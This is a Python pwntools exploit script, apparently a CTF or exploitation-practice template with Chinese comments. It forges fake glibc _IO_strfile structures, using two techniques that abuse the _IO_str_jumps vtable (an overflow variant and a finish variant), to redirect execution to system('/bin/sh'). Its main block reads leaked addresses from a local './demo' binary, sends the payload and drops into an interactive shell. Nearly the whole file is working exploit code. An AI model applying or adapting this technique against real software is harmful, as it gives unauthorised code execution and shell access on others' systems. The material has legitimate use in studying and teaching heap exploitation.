from pwn import *
from base_data import *

def IOoverflow(_IO_str_jumps_addr, fun_addr, param = None, payload_addr = None):
    '''
        _IO_str_jumps_addr: _IO_str_jumps地址
        fun_addr: 函数地址
        param: 函数参数, 若param为None, 则使用payload_addr内置/bin/sh
        payload_addr: 内置/bin/sh地址, 只有在param为None时有效
        
        返回: 伪造的_IO_strfile结构体
    '''
    if (param is None and payload_addr is None):
        raise ValueError("必须设置 param 或 payload_addr 参数")

    if param is None:
        # 设置参数
        param = payload_addr + 0x30
        pass
    
    payload = b''
    payload = set_value(payload, 0x0, 0)                            # fake_IO_FILE->_flags = 0
    payload = set_value(payload, 0x20, 0)                           # fake_IO_FILE->_IO_write_base = 0
    payload = set_value(payload, 0x28, int((param - 100) / 2 + 1))  # fake_IO_FILE->_IO_write_ptr = (binsh地址 - 100) / 2 + 1
    payload = set_value(payload, 0x30, BINSH)                       # 内置/bin/sh
    payload = set_value(payload, 0x38, 0)                           # fake_IO_FILE->_IO_buf_base = 0
    payload = set_value(payload, 0x40, int((param - 100) / 2))      # fake_IO_FILE->_IO_buf_end = (binsh地址 - 100) / 2
    payload = set_value(payload, 0xC0, 0)                           # fake_IO_FILE->_mode = 0
    payload = set_value(payload, 0xD8, _IO_str_jumps_addr)          # fake_IO_FILE + 0xD8 = &_IO_str_jumps
    payload = set_value(payload, 0xE0, fun_addr)                    # fake_IO_FILE + 0xE0 = &system
    return payload

def IOfinish(_IO_str_jumps_addr, fun_addr, param = None, payload_addr = None):
    '''
        _IO_str_jumps_addr: _IO_str_jumps地址
        fun_addr: 函数地址
        param: 函数参数, 若param为None, 则使用payload_addr内置/bin/sh
        payload_addr: 内置/bin/sh地址, 只有在param为None时有效
        
        返回: 伪造的_IO_strfile结构体
    '''
    if (param is None and payload_addr is None):
        raise ValueError("必须设置 param 或 payload_addr 参数")

    if param is None:
        # 设置参数
        param = payload_addr + 0x30
        pass
    payload = b''
    payload = set_value(payload, 0x0, 0);                           # fake_IO_FILE->_flags = 0
    payload = set_value(payload, 0x20, 0);                          # fake_IO_FILE->_IO_write_base = 0
    payload = set_value(payload, 0x28, 1);                          # fake_IO_FILE->_IO_write_ptr = 1
    payload = set_value(payload, 0x30, BINSH)                       # 内置/bin/sh
    payload = set_value(payload, 0x38, param);                      # fake_IO_FILE->_IO_buf_base = /bin/sh地址
    payload = set_value(payload, 0xC0, 0);                          # fake_IO_FILE->_mode = 0
    payload = set_value(payload, 0xD8, _IO_str_jumps_addr - 0x8);   # fake_IO_FILE + 0xD8 = &(_IO_str_jumps-0x8)
    payload = set_value(payload, 0xE8, fun_addr);                   # fake_IO_FILE + 0xE8 = system
    return payload


if __name__ == '__main__':
    p = process('./demo')
    
    _IO_str_jumps_addr = int(p.recv(14), 16)
    system_addr = int(p.recv(14), 16)
    binsh_addr = int(p.recv(14), 16)
    
    # p.send(IOoverflow(_IO_str_jumps_addr, system_addr, binsh_addr))
    p.send(IOfinish(_IO_str_jumps_addr, system_addr, binsh_addr))
    
    p.interactive()
